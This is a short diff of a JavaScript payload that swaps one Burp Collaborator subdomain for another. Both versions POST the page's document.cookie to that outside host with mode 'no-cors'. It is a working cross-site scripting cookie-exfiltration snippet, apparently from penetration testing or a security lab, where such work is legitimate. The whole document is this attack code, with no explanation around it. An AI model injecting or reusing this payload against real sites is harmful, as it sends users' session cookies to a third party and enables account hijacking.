@@ -1,4 +1,4 @@
-fetch('http://i7ql06bzoj2juwcmx79jxnqn5eb4zt.burpcollaborator.net/x', {
+fetch('http://spl82c321b6yah3ug7joaebo8fe52u.burpcollaborator.net/x', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
